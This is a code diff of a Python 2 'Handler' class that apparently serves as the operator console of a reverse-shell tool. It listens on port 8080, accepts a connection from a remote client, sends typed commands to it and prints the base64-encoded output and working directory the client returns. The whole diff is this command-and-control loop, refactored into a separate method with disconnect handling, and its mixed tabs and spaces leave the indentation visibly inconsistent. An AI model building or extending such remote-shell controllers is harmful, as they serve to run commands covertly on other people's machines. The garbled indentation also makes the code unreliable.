@@ -40,36 +40,41 @@ class Handler:
 							data_package["cwd"] + ">>"
 							
 		self.prompt = self.prompt.strip()
-
-	def start(self):
+        
+        def start(self):
             while True:
-		self.server_sock.listen(5)
-		self.client_socket, _ = self.server_sock.accept()
-		print "[*] Connection established! "
-		while True:
-			user_input = raw_input("\n" + self.prompt + " ")
-			if user_input == "help":
-				print "Available commands:\n prompt - change prompt"
-                        else:
-                            try:
-			        self.send_cmd(user_input)
-			        data = self.client_socket.recv(4096)
-                                try:
-			            data_package = json.loads(data)
-			            for key in data_package:
-			                data_package[key] = base64.b64decode(data_package[key])
+                self.server_sock.listen(5)
+                self.client_socket, _ = self.server_sock.accept()
+                self.interface()
+
+	def interface(self):
+	    print "[*] Connection established! "
+	    while True:
+	        user_input = raw_input("\n" + self.prompt + " ")
+		if user_input == "help":
+		    print "Available commands:\n prompt - change prompt"
+                else:
+                    try:
+		        self.send_cmd(user_input)
+			data = self.client_socket.recv(4096)
+                                
+                        if not data: raise Exception("[-] Client Disconnected")
+                        try:
+			    data_package = json.loads(data)
+			    for key in data_package:
+			        data_package[key] = base64.b64decode(data_package[key])
 			
-			            self.make_prompt(data_package)
+			    self.make_prompt(data_package)
 			
-			            sys.stdout.write(data_package["data"])
-			        except Exception as e:
-			            print "[-] Whoooops"
-			            print str(e)
-                            except Exception as e:
-                                print "Something went wrong" 
-                                print "[-] Broken pipe..."
-                                print "[*] Attempting reconnection"
-                                break
+			    sys.stdout.write(data_package["data"])
+			except Exception as e:
+			        print "[-] Whoooops"
+			        print str(e)
+                    except Exception as e:
+                            print "Something went wrong" 
+                            print "[-] Broken pipe..."
+                            print "[*] Attempting reconnection"
+                            break
 
                             
 handler = Handler("0.0.0.0", 8080)
